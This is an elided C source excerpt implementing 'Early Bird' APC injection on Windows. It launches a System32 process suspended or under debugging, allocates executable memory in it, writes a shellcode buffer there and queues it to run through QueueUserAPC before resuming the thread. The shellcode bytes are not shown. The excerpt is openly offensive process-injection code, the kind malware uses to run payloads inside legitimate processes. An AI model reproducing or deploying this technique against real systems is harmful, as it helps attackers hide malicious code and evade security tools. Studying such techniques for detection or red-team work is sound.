...
void CreateEarlyBird_1(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwProcessId) {
    STARTUPINFOA Si = {0};
...
void EarlyBird_APCinjection_1(char* lpProcessName) {
    char lpPath[666];
    ...
    printf("\n[+] Starting with CREATE_SUSPENDED flag : \"%s\" ... ", lpPath);

    CreateEarlyBird_1(lpPath, &hProcess, &hThread, &dwProcessId);

    LPVOID memPoolPtr = VirtualAllocEx(hProcess, NULL, sizeof(shellcode_64), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, memPoolPtr, shellcode_64, sizeof(shellcode_64), NULL);

    QueueUserAPC((PAPCFUNC)memPoolPtr, hThread, 0);

    ResumeThread(hThread);
}

void CreateEarlyBird_2(char *lpPath, PHANDLE hProcess, PHANDLE hThread, PDWORD dwProcessId) {
    STARTUPINFOA Si = {0};
	PROCESS_INFORMATION Pi = {0};
...
void EarlyBird_APCinjection_2(char* lpProcessName) {
    char lpPath[666];
    ...
    sprintf(lpPath, "C:\\windows\\System32\\%s", lpProcessName);
    printf("\n[+] Starting with DEBUG_PROCESS flag : \"%s\" ... ", lpPath);

    CreateEarlyBird_2(lpPath, &hProcess, &hThread, &dwProcessId);
...
int main(void) {
    ...
    //EarlyBird_APCinjection_1(lpProcessName);
    EarlyBird_APCinjection_2(lpProcessName);
